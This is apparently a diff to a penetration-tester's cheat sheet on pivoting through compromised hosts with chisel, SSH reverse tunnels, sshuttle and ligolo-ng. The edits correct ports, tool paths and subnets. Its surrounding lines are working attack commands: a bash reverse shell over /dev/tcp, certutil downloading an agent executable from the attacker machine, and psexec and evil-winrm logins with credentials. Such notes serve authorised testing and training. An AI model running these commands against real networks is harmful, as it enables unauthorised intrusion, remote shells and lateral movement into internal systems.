@@ -70,7 +70,7 @@ impacket-psexec 'DOMAIN/user:pass'@10.10.10.5
 ./chisel server -p 8080 --reverse
 
 # Target:
-.\chisel client $KALI:9001 R:socks
+./chisel client $KALI:8080 R:socks
 
 # Use:
 proxychains -q nmap -sT -Pn <internal_ip>
@@ -134,10 +134,9 @@ ssh -N -R 127.0.0.1:2345:INTERNAL_IP:5432 kali@KALI_IP
 # Now on Kali: psql -h 127.0.0.1 -p 2345
 
 # REMOTE DYNAMIC SOCKS (reverse SOCKS — pivot initiates connection back to Kali)
-# On Kali first: ssh into pivot, then:
-ssh -N -R 1080 user@PIVOT
+# Run FROM the pivot (requires an SSH server on Kali):
+ssh -N -R 1080 kali@KALI_IP
 # On Kali: proxychains config: socks5 127.0.0.1 1080
-# This creates a SOCKS proxy on Kali that routes through the pivot
 
 # sshuttle (VPN-like — easiest if SSH available)
 sshuttle -r user@PIVOT 10.10.10.0/24 -x PIVOT_IP
@@ -192,7 +191,7 @@ NETWORK LAYOUT:
 # On Kali: create TUN + start proxy
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
-ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+~/Tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601
 
 # On Pivot1: connect agent back to Kali
 ./agent -connect KALI_IP:11601 -ignore-cert
@@ -203,9 +202,9 @@ ligolo-proxy -selfcert -laddr 0.0.0.0:11601
 » start                         # start tunnel on default 'ligolo' tun
 
 # On Kali (new terminal): add route to first internal network
-sudo ip route add $TARGET/24 dev ligolo
+sudo ip route add 172.16.1.0/24 dev ligolo
 
-# VERIFY: you can now reach $TARGET/24 from Kali
+# VERIFY: you can now reach 172.16.1.0/24 from Kali
 nmap -sT -Pn -p 445 172.16.1.X
 ```
 
@@ -235,7 +234,7 @@ certutil -urlcache -f http://KALI_IP/agent.exe C:\temp\agent.exe
 
 # In ligolo proxy console — select the PIVOT1 session first:
 » session                       # pick Pivot1
-» listener_add --addr 0.0.0.0:11602 --to 0.0.0.0:11601 --tcp
+» listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
 # This means: anything hitting Pivot1:11602 gets forwarded to Kali:11601
 ```
 
@@ -266,7 +265,7 @@ Now Kali can reach both internal networks directly:
 
 ```bash
 # First network (through ligolo tun):
-nmap -sT -Pn $TARGET/24
+nmap -sT -Pn 172.16.1.0/24
 # Second network (through ligolo2 tun):
 nmap -sT -Pn 192.168.1.0/24
 evil-winrm -i 192.168.1.5 -u admin -p password
@@ -298,7 +297,7 @@ bash -c 'bash -i >& /dev/tcp/192.168.1.PIVOT2/4444 0>&1'
 chisel server -p 8080 --reverse
 # On Pivot1:
 ./chisel client KALI_IP:8080 R:socks
-# Now Kali has SOCKS on 127.0.0.1:1080 into $TARGET/24
+# Now Kali has SOCKS on 127.0.0.1:1080 into 172.16.1.0/24
 
 # Hop 2: Pivot2 → Pivot1
 # On Pivot1 — start a second chisel server:
